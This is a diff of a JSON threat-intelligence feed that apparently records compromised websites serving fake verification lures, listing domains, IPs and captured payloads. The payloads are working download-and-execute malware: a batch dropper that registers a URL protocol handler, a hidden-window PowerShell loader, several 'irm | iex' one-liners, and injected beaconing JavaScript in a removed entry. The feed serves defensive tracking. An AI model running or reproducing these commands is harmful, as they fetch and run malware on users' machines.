@@ -1,5 +1,142 @@
 [
   {
+    "UrlDomain": "eliteintegralstaffing.com",
+    "DeliveryUrl": [
+      "nodetoken9063.com"
+    ],
+    "PayloadUrl": [
+      "https://nodetoken9063.com/ue/x/3qsMg8x6",
+      "https://nodetoken9063.com/ue/b/3qsMg8x6",
+      "https://nodetoken9063.com/ue/c/3qsMg8x6"
+    ],
+    "IP": [
+      "141.193.213.10"
+    ],
+    "Related": [],
+    "Payload": "@echo off\r\nif \"%~1\"==\"_h\" goto :work\r\nstart \"\" /min cmd /c call \"%~f0\" _h\r\nexit /b\r\n:work\r\ntimeout /t 1 >nul\r\nset \"d=%APPDATA%\\Microsoft\\Windows\\Themes\"\r\nset \"l=%PUBLIC%\\v.txt\"\r\nmd \"%d%\" 2>nul\r\ncd /d \"%d%\"\r\necho z>>\"%l%\"\r\ndel /q v.txt 2>nul\r\ndel /q vclreg.exe 2>nul\r\ndel /q vclx370.dat 2>nul\r\nif exist vclreg.exe echo lockexe>>\"%l%\"\r\nif exist vclx370.dat echo lockbpl>>\"%l%\"\r\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclreg.exe https://nodetoken9063[.]com/ue/x/3qsMg8x6 <nul\r\necho x%errorlevel%>>\"%l%\"\r\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclx370.dat https://nodetoken9063[.]com/ue/b/3qsMg8x6 <nul\r\necho b%errorlevel%>>\"%l%\"\r\ndel /q vclreg.exe:Zone.Identifier 2>nul\r\ndel /q vclx370.dat:Zone.Identifier 2>nul\r\nver >nul\r\n>t echo 3qsMg8x6 nodetoken9063[.]com\r\nif exist vclreg.exe echo exe>>\"%l%\"\r\nif exist vclx370.dat echo bpl>>\"%l%\"\r\nfor %%f in (vclreg.exe vclx370.dat) do echo %%~zf>>\"%l%\"\r\nif exist vclreg.exe if exist vclx370.dat (\r\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /ve /d \"URL:vclimg\" >nul\r\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /v \"URL Protocol\" /d \"\" >nul\r\nreg add \"HKCU\\Software\\Classes\\vclimg\\shell\\open\\command\" /f /ve /t REG_SZ /d \"\\\"%d%\\vclreg.exe\\\" -q \\\"%d%\\vclx370.dat\\\"\" >nul\r\necho r%errorlevel%>>\"%l%\"\r\n>\"%TEMP%\\t.url\" echo [InternetShortcut]\r\n>>\"%TEMP%\\t.url\" echo URL=vclimg:x\r\n%SystemRoot%\\explorer.exe \"%TEMP%\\t.url\"\r\n)\r\necho s%errorlevel%>>\"%l%\"\r\ntimeout /t 1 >nul\r\nreg delete \"HKCU\\Software\\Classes\\vclimg\" /f >nul\r\ndel /q \"%TEMP%\\t.url\" 2>nul",
+    "ResolvedDownloadUrl": [
+      "https://nodetoken9063.com/ue/x/3qsMg8x6",
+      "https://nodetoken9063.com/ue/b/3qsMg8x6"
+    ],
+    "ReportId": "cmwjh9k7k18qy0oml2oqlslfj",
+    "ScannedAt": "2026-11-16T16:28:21.560000+00:00"
+  },
+  {
+    "UrlDomain": "www.shoeaid.co.uk",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "46.30.213.26"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/ed9fa08a4fa76c6c",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/ed9fa08a4fa76c6c'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/ed9fa08a4fa76c6c"
+    ],
+    "ReportId": "cmwjgtb3118ia0omlurpyuw41",
+    "ScannedAt": "2026-11-16T16:15:43.236000+00:00"
+  },
+  {
+    "UrlDomain": "eviamedical.com",
+    "DeliveryUrl": [
+      "fbifr.com"
+    ],
+    "PayloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "IP": [
+      "162.159.134.42"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "ReportId": "cmwjgldww18ag0omls2876jau",
+    "ScannedAt": "2026-11-16T16:09:33.652000+00:00"
+  },
+  {
+    "UrlDomain": "hipermar.com.br",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.53.222"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/90b3a8292e39b3c9",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/90b3a8292e39b3c9'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/90b3a8292e39b3c9"
+    ],
+    "ReportId": "cmwjgjbds18760omlye859nvq",
+    "ScannedAt": "2026-11-16T16:07:57.087000+00:00"
+  },
+  {
+    "UrlDomain": "www.embalafacil.es",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "82.223.4.108"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/d672b0f95721a987",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29914085",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/d672b0f95721a987'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/d672b0f95721a987"
+    ],
+    "ReportId": "cmwjgg9dc17z70oml35rrf75e",
+    "ScannedAt": "2026-11-16T16:05:34.520000+00:00"
+  },
+  {
+    "UrlDomain": "kafluzglobal.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "170.39.213.22"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/062c477a90814654",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=7461e8c0bb505b66188eb183e88b86881ea65d410314faf5",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/062c477a90814654'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/062c477a90814654"
+    ],
+    "ReportId": "cmwjgekmp17wn0omlkwsofjbb",
+    "ScannedAt": "2026-11-16T16:04:15.798000+00:00"
+  },
+  {
     "UrlDomain": "futureexpected.com",
     "DeliveryUrl": [
       "fbifr.com"
@@ -6557,101 +6694,5 @@
     ],
     "ReportId": "cmwccx3dt078o0omlivx66n50",
     "ScannedAt": "2026-11-11T16:52:18.178000+00:00"
-  },
-  {
-    "UrlDomain": "sevox.net",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "207.174.214.171"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
-    ],
-    "ReportId": "cmwcc66iw07310omlt924pkt8",
-    "ScannedAt": "2026-11-11T16:31:22.552000+00:00"
-  },
-  {
-    "UrlDomain": "hydebuild.com.au",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "27.123.26.225"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
-    ],
-    "ReportId": "cmwcc4tsn071c0omltwru33xb",
-    "ScannedAt": "2026-11-11T16:30:19.360000+00:00"
-  },
-  {
-    "UrlDomain": "bgrsportzz.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "66.116.209.33"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
-    ],
-    "ReportId": "cmwcbl5u006vv0omlb42loz7x",
-    "ScannedAt": "2026-11-11T16:15:01.776000+00:00"
-  },
-  {
-    "UrlDomain": "brightedu.vn",
-    "DeliveryUrl": [
-      "content-collector.com",
-      "js-staticdelivery.com",
-      "document.head.appendchild"
-    ],
-    "PayloadUrl": [
-      "https://content-collector.com/dyjjs2ggewlxgmke",
-      "https://js-staticdelivery.com"
-    ],
-    "IP": [
-      "103.57.223.36"
-    ],
-    "Related": [
-      {
-        "Value": "https://js-staticdelivery.com/e.js?_=1794413201775",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://js-staticdelivery.com/api/js/beacon/8008b4f134704bdd?event=visit&amp;note=&amp;page=https%3a%2f%2fbrightedu.vn%2f&amp;ref=&amp;_=1794413203964",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://js-staticdelivery.com/api/js/beacon/8008b4f134704bdd?event=click&amp;note=&amp;page=https%3a%2f%2fbrightedu.vn%2f&amp;ref=&amp;_=1794413207817",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "powershell -c \\\"irm 'https://content-collector[.]com/dYjJs2gGewlXGMKe'|powershell -\\\"\"; (function(){var C=\"8008b4f134704bdd\",B=\"https://js-staticdelivery[.]com\";var FS=0,HC=0,OBF=1,AFTER=\"close\",REDIR=\"\";function _pg(){try{return{page:location.href||\"\",ref:document.referrer||\"\"};}catch(e){return{page:\"\",ref:\"\"};}}function pb(ev,nt){try{var pg=_pg();var u=B+\"/api/js/beacon/\"+encodeURIComponent(C)+\"?event=\"+encodeURIComponent(ev)+\"&note=\"+encodeURIComponent(nt||\"\")+\"&page=\"+encodeURIComponent(pg[.]page)+\"&ref=\"+encodeURIComponent(pg.ref)+\"&_=\"+Date.now();var s=document.createElement(\"script\");s.src=u;s.async=true;document.head.appendChild(s);}catch(e){}}window.__panelBeacon=pb;function _capClick(t){if(!t)return false;if(t.id===\"cfm-cb\"||t.id===\"cfm-ck\")return true;if(t.closest&&(t.closest(\"#cfm-cb\")||t.closest(\"#cfm-ck\")||t.closest(\".checkbox-window\")||t.closest(\".checkbox-container\")))return true;return false;}function _rid(n){var c='abcdefghijklmnopqrstuvwxyz0123456789',s='';for(var i=0;i",
-    "ResolvedDownloadUrl": [
-      "https://content-collector.com/dYjJs2gGewlXGMKe",
-      "https://js-staticdelivery.com"
-    ],
-    "ReportId": "cmwcbb1wp06p00omllkagp0ih",
-    "ScannedAt": "2026-11-11T16:07:10.237000+00:00"
   }
 ]
